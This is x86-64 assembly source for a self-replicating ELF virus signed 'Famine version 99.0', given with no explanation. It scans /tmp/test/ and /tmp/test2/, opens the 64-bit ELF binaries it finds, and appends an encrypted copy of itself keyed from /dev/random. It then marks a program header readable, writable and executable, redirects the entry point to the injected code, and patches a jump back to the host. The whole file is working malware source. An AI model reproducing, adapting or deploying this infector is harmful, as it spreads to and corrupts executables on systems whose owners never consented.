%include "includes/header.s"

SECTION .TEXT EXEC WRITE
global  _start                              ;must be declared for linker (ld)

_start:   ;Entry-Point
PUSH
jmp .enc_start
DECYPHER


.enc_start:
	mov rax, _fork
	syscall
	cmp rax, 0
	POP
	jne _exx

	mov rbp, rsp
	sub rbp, famine_size  ; reserve famine_size bytes on the stack
.get_rand_key:
	lea rdi, [rel random]
	mov rsi, O_RDONLY
	mov rax, _open
	syscall					; OPEN /dev/random  EXIT if not work
	cmp rax, 0
	jl	_exx_pop

	mov rdi, rax		; fd to read
	mov rax, _read
	mov rdx, 1
	lea rsi, STACK(famine.key)
	syscall				; READ 2 byte, 1 for key, 1 for derivate
	
	mov rdi, rax		; fd to read
	mov rax, _read
	mov rdx, 1
	lea rsi, STACK(famine.factor)
	syscall				; READ 2 byte, 1 for key, 1 for derivate
	lea rdi, [rel infect_dir] ; load dir str

.opendir:
	mov r14, rdi
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall				;	open directory
	test eax, eax
	jl .nextdir
	mov STACK(famine.dir_fd), rax		; save dir_fd

.readdir:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents)
	mov rdi, STACK(famine.dir_fd)
	mov rax, _getdents
	syscall				;	get directory entries
	test  rax,rax
	jle .closedir		;	no more entries
	mov r13, 0
	mov r12, rax

.file:
	; check directory entry for a regular file
	lea rdi, STACK(famine.dirents)
	add rdi, r13
	movzx edx, word[rdi + dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_REG
	jne .nextfile
	call process		; process the file

.nextfile:
	cmp r13, r12		; check if directory entry looping is over 
	jl .file
	jmp .readdir		; read dir for more entry

.closedir:
	mov rdi, STACK(famine.dir_fd)
	mov rax, _close
	syscall

.nextdir:
	mov ecx, 0
	mul ecx
	dec ecx
	mov rdi, r14
	repnz scasb		; next infect_dir
	cmp byte[rdi], 0
	jnz .opendir
	POP		; restore register 
	jmp _exx		;jump to the end

process:
	mov rsi, r14  ; r14 hold infect dir
	mov rax, rdi
	lea rdi, STACK(famine.file_path)  ; load stack addr to store file_path
	mov rdx, rdi

.dirname:
	movsb			; load dirname to rdi
	cmp byte [rsi], 0
	jnz .dirname
	mov rsi, rax

.filename:
	movsb			; append filename to dirname to get full path
	cmp byte[rsi - 1], 0
	jnz .filename
	mov rdi, rdx
				;open file
	mov rsi, O_RDWR
	mov rax, _open
	syscall			; open


	test eax, eax
	jl .return
	mov STACK(famine.file_fd), rax		; save result from open to stack

				;stat
	lea rsi, STACK(famine.stat)
	mov rdi, rax
	mov rax, _fstat
	syscall
	cmp rax, 0
	jnz .close
	mov rsi, qword STACK(famine.stat + stat.st_size)	; file size from stat to rsi
	mov STACK(famine.file_size), rsi	; save file size to stack 
	cmp rsi, elf64_ehdr_size + elf64_phdr_size + FAMINE_SIZE  ; check if size < ehdr_size + phdr size + famine_size
	jl .close
				;MMAP file
	mov r9, 0
	mov r8, STACK(famine.file_fd)  ; restore file_fd
	mov r10, MAP_SHARED
	mov rdx, PROT_READ | PROT_WRITE
	xor rdi, rdi
	mov rax, _mmap
	syscall

	cmp rax, MMAP_ERRORS
	jae .close
	
	mov STACK(famine.file_data), rax	; save mmap to file from rax to stack
	mov rdi, rax						; 
	call check_elf64
	test al,al
	jz .unmap
	call inject_self

.unmap:
	mov rsi, STACK(famine.file_size)
	mov rdi, STACK(famine.file_data)
	mov rax, _munmap
	syscall

.close:
	mov rdi, STACK(famine.file_fd)
	mov rax, _close
	syscall

.return:
	ret

check_elf64:
	xor rax, rax
	cmp qword[rdi+8], rax
	jnz .return
	mov rdx, _SYSV_			;elf SYSV
	cmp qword [rdi], rdx
	jz .continue
	mov rdx, _GNU_			;ELF_GNU
	cmp qword[rdi], rdx
	jnz .return

.continue:
	mov rdx, _DYN_
	cmp qword[rdi + 16], rdx  ; DYN
	jz .ok
	mov rdx, _EXEC_
	cmp qword[rdi + 16], rdx	; EXEC
	jnz .return
.ok:
	inc rax
.return:
	ret

inject_self:
	push r13		; save registers in case we need to restore 
	push r14
	push r15
	mov r15, rdi ; save phdr[0] offset to r15
	mov rdx, qword [rdi + elf64_ehdr.e_entry]
	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
	mov rax, qword[rdi + elf64_ehdr.e_phoff]
	add rdi,rax
	mov r14, rdi  ; save phdr[0] offset to r14

	.segment:
	cmp rcx, 0
	jl .return
	mov ax, SEGMENT_TYPE
	mov r11w, word [rdi]
	cmp ax, r11w
	jnz .next
	jmp .infect

	.next:
	add rdi, elf64_phdr_size  ; add phdr size to rdi to loop through pheaders
	dec rcx					  ; decrement phnum
	jmp .segment

	.infect:
	push rdi ; save phdr to infect offset to  stack

; get target End of file
	mov rdi, STACK(famine.file_fd) ; target fd to rdi
	mov rsi, 0 ; offset 0
	mov rdx, END_SEEK
	mov rax, _lseek
	syscall
	push rax; save eof from lseek to stack

	; get delta  ( address at execution time)
	call .delta
	.delta:
	pop r13
	sub r13, .delta
	
	; load cypher and write v
	lea rsi, [r13 + _start] ; load _start addr to rsi
	mov rdx, _end - _start  ; virus size to rdx
	lea r10, STACK(famine.tocypher)  ; r10 hold future v-location in stack
	.loading_v:
		mov r11b, byte[rsi]
		mov [r10], r11b
		inc rsi
		inc r10
		dec rdx
		cmp rdx, 0
		jg .loading_v
	CYPHER

	mov rdi, STACK(famine.file_fd) ; fd to rdi
	lea rsi, STACK(famine.tocypher)
	mov rdx, _end - _start  ; virus size to rdx
	pop r10 ; rax hold eof from lseek syscall 
	push r10
	mov rax, _pwrite
	syscall

	cmp rax, 0
	jbe .return

	mov rdi, STACK(famine.file_fd) ; fd to rdi
	mov rax, _pwrite			;OVERWRITE THE JUMP OVER DECYPHER METHOD WITH VALUE 0
	lea rsi, [rel signature]
	mov rdx, 1
	add r10, 25 ; FILE EOF + 25 = JUMP OVER DECYPHER VAL OFFSET
	syscall

	pop r10
	push r10
	mov rdi, STACK(famine.file_fd) ; fd to rdi
	mov rax, _pwrite			;OVERWRITE THE VALUE OF KEY IN DECYPHER
	lea rsi, STACK(famine.key)
	mov rdx, 1
	add r10, 30 ; FILE OEF + 30 = KEY OFFSET
	syscall

	pop r10
	push r10
	mov rdi, STACK(famine.file_fd) ; fd to rdi
	mov rax, _pwrite			;OVERWRITE THE FACTOR VALUE
	lea rsi, STACK(famine.factor)
	mov rdx, 1
	add r10, 79 ; FILE EOF + 80 = KEY FACTOR OFFSET
	syscall


	.edit_phdr:
	pop rax				;RDI = the offset of patched PHEADER
	pop rdi
	push rdi
	push rax
	mov dword [rdi], 1
	mov eax, PF_R	; READ
	or eax, PF_X	; EXEC
	or eax, PF_W	; WRITE
	mov dword [rdi + 4], eax   ;SET PERMS !
	pop rax				; RAX = The offset of our injected V , (old EOF)
	mov [rdi + 8], rax  ; set phdr.offset  = rax
	mov r13, qword STACK(famine.stat + stat.st_size) ; load target size to r13
	add r13, 0xc000000 ; add vsize to r13
	mov [rdi + 16], r13 ; edit  p_vaddr
	mov [rdi + 24], r14 ; change paddr to new size
	mov qword [rdi + 48], 0x200000  ; set align to 2mb
	add qword [rdi + 32], _end - _start + 5
	add qword [rdi + 40], _end - _start + 5

	;	write it
	mov rdi, STACK(famine.file_fd)
	lea rsi, [rdi]
	mov dx, PHDR_SIZE
	mov r10, r14
	mov rax, _pwrite
	syscall

	.edit_ehdr:
	mov rdi, STACK(famine.file_data)
	mov r14, [rdi + elf64_ehdr.e_entry ] ; save original e_entry to r14
	mov [rdi + elf64_ehdr.e_entry], r13 ; set ehdr.e_entry to vaddr of injected
	
	;write it
	mov rdi, STACK(famine.file_fd)
	mov rsi, r15
	mov rdx, EHDR_SIZE				; 64 is size of EHDR
	mov r10, 0
	mov rax, _pwrite
	syscall

	.jmp_wuw:
	mov rdi , STACK(famine.file_fd)
	mov rsi, 0
	mov rdx, END_SEEK
	mov rax, _lseek
	syscall						; seek to file_end
	
;	compute jump value
	pop rdi ;   restore patched pheader 
	mov rdx, [rdi + elf64_phdr.p_vaddr]
	sub rdx, 9
	sub r14, rdx
	sub r14, _end - _start
	mov byte STACK(famine.jmp), JMP; jmp opcode
	mov dword STACK(famine.jmp + 1), r14d

;write it
	mov rdi, STACK(famine.file_fd)
	lea rsi, STACK(famine.jmp)
	mov rdx, 5
	sub rax, 14  ; offset between _end:  and jump .exit
	mov r10, rax ; EOF From last call to lseek
	mov rax, _pwrite
	syscall

	mov rax, _sync
	syscall
	.return :
		pop r15		; restore saved registers
		pop r14
		pop r13
		ret

infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
random			db			"/dev/random"
enc_end:
	db 0
signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
famine_entry	dq			_start

_exx_pop:
POP
_exx:
jmp .exit	; at source execution of famine this will exit. when written to target jump is edited to host entry
	.exit:
		mov rax, _exit
		mov rdi, 0
		syscall

_end:
